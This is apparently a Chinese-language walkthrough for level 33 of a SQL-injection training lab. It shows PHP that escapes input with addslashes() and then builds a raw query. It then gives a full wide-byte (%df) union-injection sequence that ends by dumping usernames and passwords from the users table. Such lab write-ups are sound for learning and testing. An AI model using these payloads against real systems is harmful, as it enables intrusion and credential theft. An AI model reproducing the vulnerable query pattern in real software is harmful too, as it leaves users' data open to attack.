---
title: less33
url: https://www.yuque.com/u29002979/ep2zrx/gwz6ithqpupgie1m
---

```bash
function check_addslashes($string)
{
    $string= addslashes($string);    
    return $string;
}

$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
```

Less33通关方式与Less32一模一样
区别在于后台在Less33使用了**addslashes()**这个函数对字符串进行转义，
Less32手动添加过滤转义 <a name="EkWN2"></a>

# 宽字节注入

```bash
检查注入点
1'
单引号被转义了。
?id=1%df' and 1=1--+

判断字段数 
?id=1%df' and 1=1 order by 4--+ 

?id=1%df' and 1=1 order by 3--+ 
正常回显，有3列

找回显点
?id=1%df' and 1=2 union select 1,2,3--+  
显示2，3是回显点

爆破数据库名称
?id=1%df' and 1=2 union select 1,2,database()--+

爆破数据库表名称
?id=1%df' and 1=2 union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database()--+

爆破字段名称
users的16进制是0x7573657273
?id=1%df' and 1=2 union select 1,2,group_concat(column_name)from information_schema.columns where table_schema=database() and table_name=0x7573657273--+

爆破字段内容
?id=1%df' and 1=2 union select 1,2,(select group_concat(username,0x7e,password) from users)--+
```
